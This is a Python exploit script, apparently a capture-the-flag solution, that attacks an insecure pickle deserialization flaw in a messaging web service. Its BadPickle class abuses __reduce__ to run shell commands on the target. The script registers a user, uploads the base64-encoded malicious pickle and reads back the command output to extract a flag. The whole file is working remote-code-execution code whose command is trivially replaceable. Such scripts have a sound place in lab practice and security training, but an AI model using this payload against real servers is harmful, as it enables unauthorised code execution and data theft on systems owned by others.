#!/usr/bin/env python3

import argparse
import base64
import os
import pickle
import platform
import re
import requests
import subprocess

class BadPickle:
    def __reduce__(self):
        ############################################################
        # These two lines take advantage of the ability to
        # dynamically import modules in Python. This allows the
        # attacker to import target modules required for their
        # exploit to work correctly. In this example the modules
        # PLATFORM and OS will be used in the exploit.
        ############################################################
        import platform
        import subprocess

        ############################################################
        # The if-else block below handles the OS type the insecure
        # deserialization will take place on. The variables preent
        # in the current block are placeholders and will show that
        # the pickle vulnerability is present in the target system.
        ############################################################
        # cmd - command to execute.
        ############################################################
        if platform.system().lower() == "linux":
            cdir = "/"
            cmd = (("cat", "flag.txt",),)
        else:
            cdir = "C:\\"
            cmd = (("type", "flag.txt"),)

        #return (os.system, cmd)
        return (subprocess.check_output, cmd)
    
class Attacker:
    def __init__(self, baseurl):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")
        
        self.baseurl = baseurl
        self.username = "tester"
        self.__priv_pem_file = "hammond_private_key.pem"
        self.__pub_pem_file = "hammond_public_key.pem"

        self.__priv_pem, success, message = self.__read_pem(self.__priv_pem_file)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        self.__pub_pem, success, message = self.__read_pem(self.__pub_pem_file)
        if not(success):
            raise ValueError(message)
        SucMsg(message)
        return
    
    def __read_pem(self, pemfile):
        message = str()
        peminfo = str()
        success = bool()

        try:
            with open(pemfile, "r") as f:
                peminfo = f.read()

            message = f"\"{pemfile}\" successfully read"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (peminfo, success, message)

    def register_user(self):
        message = str()
        success = bool()

        try:
            data = {"username": self.username, "public_key_pem": self.__pub_pem}
            response = requests.post(f"{self.baseurl}/register", json=data)
            respJson = response.json()

            if "error" in respJson:
                raise ValueError(respJson.get("error"))

            message = "\"{self.username}\" successfully registered"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def deliver_payload(self):
        message = str()
        success = bool()

        try:
            # this data will be transmitted to the vulnerable server.
            # the malicious pickle will be in the "encryptedMessage"
            # portion of the payload. when the target processes this
            # request and payload, the BadPickle object will fire off
            # its command which will then be saved in the target db.
            data_dict = {
                "sender_id": self.username,
                "recipient_id": self.username,
                "encryptedMessage": BadPickle(),
            }

            # Serialize the data for sending
            serialized_data = pickle.dumps(data_dict)
            encoded_message = base64.urlsafe_b64encode(serialized_data).decode()
            response = requests.post(f"{self.baseurl}/send-message", data=encoded_message)

            respJson = response.json()

            if "error" in respJson:
                raise ValueError(respJson.get("error"))

            message = "malicious pickle successfully uploaded"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)
    
    def read_output(self):
        message = str()
        outputs = list()
        success = bool()

        try:
            resp = requests.get(f"{self.baseurl}/get-messages/{self.username}")
            respJson = resp.json()

            if "error" in respJson:
                return f"Error: {respJson['error']}"

            # Deserialize and decode the data
            serialized_data = base64.urlsafe_b64decode(respJson["data"])
            packaged_messages = pickle.loads(serialized_data)

            for msg in packaged_messages:
                encrypted_message = msg["content"]
                try:
                    #######################################################
                    # the following line will append the content that was
                    # saved after RCE was conducted during the processing
                    # of the malicious pickle object.
                    #######################################################
                    outputs.append(encrypted_message.decode())
                except:
                    continue

            message = "all outputs successfully read"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (outputs, success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")
    parser.add_argument("--skip-reg", help="skip registering user", action="store_true", dest="skipreg")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    skipreg = args.skipreg

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        attacker = Attacker(baseurl=baseurl)

        if not(skipreg):
            success, message = attacker.register_user()
            if not(success):
                raise ValueError(message)
        
        success, message = attacker.deliver_payload()
        if not(success):
            raise ValueError(message)
        
        outputs, success, message = attacker.read_output()
        if not(success):
            raise ValueError(message)
        
        for output in outputs:
            flag, success, message = FindFlag(output, "flag{.*}")
            if success:
                break
        
        if not(success):
            raise ValueError("flag not found in outputs")
        SucMsg(flag)

    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()


